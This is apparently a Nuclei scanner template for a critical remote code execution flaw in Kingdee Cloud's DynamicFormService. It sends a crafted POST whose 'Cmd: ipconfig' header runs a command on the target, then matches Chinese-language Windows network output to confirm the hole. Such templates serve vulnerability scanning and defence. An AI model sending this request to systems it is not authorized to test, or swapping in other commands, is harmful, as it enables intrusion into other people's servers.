id: poc-yaml-kingdee-dynamicformservice-rce
info:
  name: Kingdee Cloud DynamicFormService RCE
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - raw:
      - |
        POST /K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DynamicForm.DynamicFormService.CloseForm.common.kdsvc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/json
        Cmd: ipconfig

        {"ap0":""}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Windows IP 配置"
          - "连接特定的 DNS 后缀"
          - "IPv4 地址"
